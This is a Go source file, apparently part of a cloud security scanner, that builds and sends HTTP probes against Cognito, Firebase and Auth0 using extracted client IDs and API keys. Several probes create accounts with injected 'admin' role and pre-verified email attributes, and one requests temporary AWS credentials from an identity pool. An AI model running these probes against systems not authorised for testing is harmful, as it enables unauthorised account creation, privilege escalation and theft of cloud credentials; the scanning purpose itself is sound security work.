package cloudposture

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// AbuseProbe describes an auth-provider abuse HTTP request template.
type AbuseProbe struct {
	Name        string            `json:"name"`
	URL         string            `json:"url"`
	Method      string            `json:"method"`
	Headers     map[string]string `json:"headers"`
	Body        string            `json:"body"`
	Signal      string            `json:"signal"`
	Description string            `json:"description"`
}

// BuildCognitoSignUpProbe creates an open-registration test for Cognito user pools.
func BuildCognitoSignUpProbe(c Credentials, username string) AbuseProbe {
	body := map[string]interface{}{
		"ClientId": c.CognitoClientID,
		"Username": username,
		"Password": "AkcaProbe1!Aa",
		"UserAttributes": []map[string]string{
			{"Name": "email", "Value": username},
			{"Name": "custom:role", "Value": "admin"},
			{"Name": "email_verified", "Value": "true"},
		},
	}
	raw, _ := json.Marshal(body)
	return AbuseProbe{
		Name:   "cognito_signup",
		URL:    fmt.Sprintf("https://cognito-idp.%s.amazonaws.com/", c.AWSRegion),
		Method: http.MethodPost,
		Headers: map[string]string{
			"Content-Type": "application/x-amz-json-1.1",
			"X-Amz-Target": "AWSCognitoIdentityProviderService.SignUp",
		},
		Body:        string(raw),
		Signal:      "cognito_open_signup",
		Description: "Tests whether Cognito user pool allows unauthenticated SignUp with attribute injection",
	}
}

// BuildCognitoIdentityProbe requests unauthenticated federated identity / STS path.
func BuildCognitoIdentityProbe(c Credentials) AbuseProbe {
	body := map[string]interface{}{
		"IdentityPoolId": c.CognitoIdentityPoolID,
		"Logins":         map[string]string{},
	}
	raw, _ := json.Marshal(body)
	return AbuseProbe{
		Name:   "cognito_get_id",
		URL:    fmt.Sprintf("https://cognito-identity.%s.amazonaws.com/", c.AWSRegion),
		Method: http.MethodPost,
		Headers: map[string]string{
			"Content-Type": "application/x-amz-json-1.1",
			"X-Amz-Target": "AWSCognitoIdentityService.GetId",
		},
		Body:        string(raw),
		Signal:      "cognito_identity_pool_access",
		Description: "Tests whether identity pool grants guest IdentityId without authentication",
	}
}

// BuildCognitoCredentialsProbe requests temporary AWS credentials via identity pool.
func BuildCognitoCredentialsProbe(c Credentials, identityID string) AbuseProbe {
	body := map[string]interface{}{
		"IdentityId": identityID,
		"Logins":     map[string]string{},
	}
	raw, _ := json.Marshal(body)
	return AbuseProbe{
		Name:   "cognito_get_credentials",
		URL:    fmt.Sprintf("https://cognito-identity.%s.amazonaws.com/", c.AWSRegion),
		Method: http.MethodPost,
		Headers: map[string]string{
			"Content-Type": "application/x-amz-json-1.1",
			"X-Amz-Target": "AWSCognitoIdentityService.GetCredentialsForIdentity",
		},
		Body:        string(raw),
		Signal:      "cognito_sts_credentials",
		Description: "Tests whether identity pool returns temporary AWS credentials",
	}
}

// BuildFirebaseSignUpProbe tests open Firebase Auth registration.
func BuildFirebaseSignUpProbe(c Credentials, email string) AbuseProbe {
	body := map[string]interface{}{
		"email":             email,
		"password":          "AkcaProbe1!Aa",
		"returnSecureToken": true,
	}
	raw, _ := json.Marshal(body)
	return AbuseProbe{
		Name:   "firebase_signup",
		URL:    fmt.Sprintf("https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=%s", c.FirebaseAPIKey),
		Method: http.MethodPost,
		Headers: map[string]string{
			"Content-Type": "application/json",
		},
		Body:        string(raw),
		Signal:      "firebase_open_signup",
		Description: "Tests whether Firebase API key allows unauthenticated account creation",
	}
}

// BuildAuth0SignupProbe tests public Auth0 database signup when client ID is exposed.
func BuildAuth0SignupProbe(c Credentials, email string) AbuseProbe {
	body := map[string]interface{}{
		"client_id":  c.Auth0ClientID,
		"email":      email,
		"password":   "AkcaProbe1!Aa",
		"connection": "Username-Password-Authentication",
		"user_metadata": map[string]string{
			"role": "admin",
		},
	}
	raw, _ := json.Marshal(body)
	return AbuseProbe{
		Name:   "auth0_signup",
		URL:    fmt.Sprintf("https://%s/dbconnections/signup", c.Auth0Domain),
		Method: http.MethodPost,
		Headers: map[string]string{
			"Content-Type": "application/json",
		},
		Body:        string(raw),
		Signal:      "auth0_open_signup",
		Description: "Tests whether Auth0 allows public database connection signup",
	}
}

// BuildProbes returns all applicable abuse probes for extracted credentials.
func BuildProbes(c Credentials) []AbuseProbe {
	email := fmt.Sprintf("akca-probe-%d@example.com", time.Now().Unix()%100000)
	var out []AbuseProbe
	if c.HasCognito() {
		out = append(out, BuildCognitoSignUpProbe(c, email))
	}
	if c.HasIdentityPool() {
		out = append(out, BuildCognitoIdentityProbe(c))
	}
	if c.HasFirebase() {
		out = append(out, BuildFirebaseSignUpProbe(c, email))
	}
	if c.Auth0Domain != "" && c.Auth0ClientID != "" {
		out = append(out, BuildAuth0SignupProbe(c, email))
	}
	return out
}

// InterpretAbuseResponse maps provider responses to vulnerability signals.
func InterpretAbuseResponse(probe AbuseProbe, status int, body string) (bool, string) {
	lower := strings.ToLower(body)
	switch probe.Signal {
	case "cognito_open_signup":
		if status == 200 && strings.Contains(lower, "userconfirmed") {
			return true, "cognito_signup_confirmed"
		}
		if status == 200 && strings.Contains(lower, "usersub") {
			return true, "cognito_signup_created"
		}
		if strings.Contains(lower, "usernotfoundexception") || strings.Contains(lower, "not authorized") {
			return false, ""
		}
	case "cognito_identity_pool_access":
		if status == 200 && strings.Contains(lower, "identityid") {
			return true, "cognito_guest_identity"
		}
	case "cognito_sts_credentials":
		if status == 200 && strings.Contains(lower, "accesskeyid") && strings.Contains(lower, "secretkey") {
			return true, "cognito_sts_leak"
		}
	case "firebase_open_signup":
		if status == 200 && strings.Contains(lower, "idtoken") {
			return true, "firebase_signup_token"
		}
		if status == 200 && strings.Contains(lower, "localid") {
			return true, "firebase_account_created"
		}
	case "auth0_open_signup":
		if status == 200 && (strings.Contains(lower, `"_id"`) || strings.Contains(lower, "user_id")) {
			return true, "auth0_signup_created"
		}
	}
	return false, ""
}

// ExtractIdentityIDFromGetId parses Cognito GetId response.
func ExtractIdentityIDFromGetId(body string) string {
	var resp struct {
		IdentityID string `json:"IdentityId"`
	}
	if json.Unmarshal([]byte(body), &resp) == nil && resp.IdentityID != "" {
		return resp.IdentityID
	}
	return ""
}

// ExecuteProbe runs an abuse probe with the given HTTP client.
func ExecuteProbe(client *http.Client, probe AbuseProbe) (status int, body string, err error) {
	if client == nil {
		client = &http.Client{Timeout: 12 * time.Second}
	}
	req, err := http.NewRequest(probe.Method, probe.URL, bytes.NewBufferString(probe.Body))
	if err != nil {
		return 0, "", err
	}
	for k, v := range probe.Headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	buf := new(bytes.Buffer)
	_, _ = buf.ReadFrom(resp.Body)
	return resp.StatusCode, buf.String(), nil
}
